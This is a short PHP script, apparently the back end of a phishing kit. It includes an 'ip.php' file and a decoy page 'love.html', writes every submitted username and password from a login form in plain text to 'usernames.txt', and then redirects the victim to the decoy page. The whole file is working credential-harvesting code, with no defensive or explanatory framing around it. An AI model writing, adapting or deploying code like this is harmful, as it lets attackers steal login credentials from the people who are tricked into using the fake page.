<?php
include 'ip.php';
include 'love.html';

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: love.html');
exit();
?>
